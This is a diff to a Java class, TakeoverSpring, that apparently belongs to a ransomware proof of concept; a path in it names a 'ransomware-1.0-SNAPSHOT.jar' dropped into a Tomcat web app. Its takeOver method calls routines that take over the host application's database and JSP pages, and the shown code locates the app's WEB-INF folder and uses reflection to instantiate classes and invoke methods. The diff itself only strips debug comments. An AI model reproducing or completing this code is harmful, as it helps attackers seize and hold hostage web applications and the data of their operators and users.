@@ -68,27 +68,10 @@ public class TakeoverSpring {
     public void takeOver() {
         System.out.println("taking over!");
 
-//        System.out.println("doing this theeeeeng!: " + beanFactory);
-//        System.out.println("class : " + beanFactory.getClass());
-//        BeanDefinition beanDefinition = new RootBeanDefinition(TestController.class, Autowire.BY_TYPE.value(), true);
-//        DefaultListableBeanFactory registry = (DefaultListableBeanFactory) beanFactory;
-//        registry.registerBeanDefinition("testController", beanDefinition);
-//        for ( String key : ctx.getServletContext().getServletRegistrations().keySet()) {
-//            System.out.println("servelet registration: " + key);
-//            // modify the handler to include a new mapping
-//        }
-//        ServletRegistration reg =  ctx.getServletContext().getServletRegistration("SpringDispatcher");
-//        System.out.println("reg class: " + reg.getClass());
-//        reg.addMapping("/foobar");
-//        for ( String map : reg.getMappings()) {
-//            System.out.println("mapping: " + map);
-//        }
-
         try {
             takeOverDatabase(jdbc);
             takeOverJsp();
         } catch (Exception e) {
-            // Crap!
             System.out.println(e);
             e.printStackTrace();
             return;
@@ -97,7 +80,6 @@ public class TakeoverSpring {
 
     private void takeOverJsp() throws Exception {
         File f = new File(TakeoverSpring.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
-        // /Users/caleb/Downloads/apache-tomcat-9.0.0.M3/webapps/SpringMvcJdbcTemplate/WEB-INF/lib/ransomware-1.0-SNAPSHOT.jar
         System.out.println("location: " + f);
         String path = f.getPath();
         int indx = path.indexOf("/WEB-INF/lib/");
@@ -185,7 +167,6 @@ public class TakeoverSpring {
             try {
                 methods = klazz.getMethods();
             } catch (Throwable e) {
-                // I really don't care.
                 continue;
             }
 
@@ -197,8 +178,6 @@ public class TakeoverSpring {
                 if (m.getParameterTypes().length != 0) {
                     continue;
                 }
-
-                //System.out.println("THIS METHOD LOOKS GOOD: " + m);
                 m.setAccessible(true);
                 for (Constructor ctor : klazz.getDeclaredConstructors()) {
                     if (ctor.getGenericParameterTypes().length == 0) {
